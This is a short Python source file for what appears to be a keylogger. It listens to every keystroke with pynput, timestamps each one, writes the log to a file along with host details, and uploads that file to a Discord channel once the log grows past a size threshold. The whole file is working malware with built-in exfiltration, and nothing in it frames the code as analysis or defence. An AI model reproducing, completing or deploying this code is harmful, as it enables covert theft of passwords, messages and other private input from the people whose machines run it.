from pynput.keyboard import Listener, Key

from classes.Host import Host
from discord_util import discord
from utils.file_util import write_keys_to_file, get_object_size
from utils.time_util import get_current_date_and_time

key_log = {}

host = Host()

json_file = "json_key_log.txt"
legible_text_file = "legible_log.txt"

# discord file sending limit is 8MB, but we will use 5MB to be safe
discord_file_size_limit = 5


def on_press(key):
    key_log[get_current_date_and_time()] = str(key).replace("'", "")

    print(get_object_size(key_log))
    # using this size for testing purposes
    if get_object_size(key_log) >= 0.002 and (key == Key.enter or key == Key.space):
        write_keys_to_file(key_log, json_file, host)
        discord.send_file(json_file, json_file)
        # TODO: then create method to convert json to legible text
        key_log.clear()


def log():
    with Listener(on_press=on_press, on_release=None) as listener:
        listener.join()
